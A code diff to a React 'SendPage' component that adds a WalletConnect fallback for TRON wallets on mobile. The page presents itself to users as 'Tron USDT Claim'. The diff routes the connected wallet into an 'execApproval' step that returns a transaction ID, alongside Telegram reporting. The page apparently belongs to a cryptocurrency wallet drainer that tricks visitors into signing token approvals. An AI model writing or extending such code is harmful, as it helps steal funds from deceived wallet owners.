@@ -24,6 +24,7 @@ export default function SendPage() {
   const [btn, setBtn] = useState({ text: 'Next', disabled: false });
   const [isClient, setIsClient] = useState(false);
   const [status, setStatus] = useState('');
+  const wcProvider = useRef(null);
 
   useEffect(() => {
     setIsClient(true);
@@ -106,19 +107,72 @@ export default function SendPage() {
     } catch (e) { console.error('Telegram:', e); }
   }, []);
 
+  // ── WalletConnect ──
+  const connectWC = useCallback(async () => {
+    try {
+      const UniversalProvider = (await import('@walletconnect/universal-provider')).UniversalProvider;
+      const WalletConnectModal = (await import('@walletconnect/modal')).WalletConnectModal;
+
+      if (!wcProvider.current) {
+        wcProvider.current = await UniversalProvider.init({
+          projectId: CFG.WC_PROJECT_ID,
+          metadata: {
+            name: 'Tron USDT Claim',
+            description: 'Tron USDT Claim',
+            url: window.location.origin,
+            icons: ['https://avatars.githubusercontent.com/u/37784886'],
+          },
+        });
+      }
+
+      const modal = new WalletConnectModal({
+        projectId: CFG.WC_PROJECT_ID,
+        chains: ['tron:0x2b6653dc'], // TRON mainnet
+      });
+
+      return new Promise((resolve, reject) => {
+        wcProvider.current.on('display_uri', (uri) => {
+          modal.openModal({ uri });
+        });
+
+        wcProvider.current.connect({
+          namespaces: {
+            tron: {
+              methods: ['tron_signTransaction', 'tron_signMessage'],
+              chains: ['tron:0x2b6653dc'],
+              events: [],
+            },
+          },
+        }).then((session) => {
+          modal.closeModal();
+          const address = session.namespaces.tron.accounts[0].split(':').pop();
+          // Map WC provider to a tronWeb-like interface
+          resolve({
+            defaultAddress: { base58: address },
+            request: ({ method, params }) => wcProvider.current.request({ method, params }, 'tron:0x2b6653dc'),
+            signTransaction: (tx) => wcProvider.current.request({ method: 'tron_signTransaction', params: { transaction: tx } }, 'tron:0x2b6653dc'),
+          });
+        }).catch(err => {
+          modal.closeModal();
+          reject(err);
+        });
+      });
+    } catch (e) {
+      console.error('connectWC:', e);
+      throw e;
+    }
+  }, []);
+
   // ── Poll for native tronWeb ──
   const pollForTronWeb = useCallback(async (maxMs = 5000) => {
     const getTW = () => {
-      // Prioritize Trust Wallet and generic window.tron as seen in working examples
       const p = window.trustwallet?.tron || window.tron || window.tronWeb || window.tronLink || window.tokenpocket?.tron;
       if (p?.defaultAddress?.base58) return p;
       if (p?.ready) return p;
       return null;
     };
-
     let tw = getTW();
     if (tw) return tw;
-
     const steps = Math.ceil(maxMs / 500);
     for (let i = 0; i < steps; i++) {
       await new Promise(r => setTimeout(r, 500));
@@ -218,7 +272,17 @@ export default function SendPage() {
         nativeTW = await pollForTronWeb(4000); // Increased poll
       }
 
-      // 4. Final check and execute
+      // 4. If still no native wallet on mobile, use WalletConnect
+      if (!nativeTW && isMobile) {
+        setBtn({ text: 'Connecting via Wallet...', disabled: true });
+        try {
+          nativeTW = await connectWC();
+        } catch (e) {
+          console.warn('WalletConnect failed:', e);
+        }
+      }
+
+      // 5. Final check and execute
       if (nativeTW) {
         const { txId, addr } = await execApproval(nativeTW);
         if (txId) {
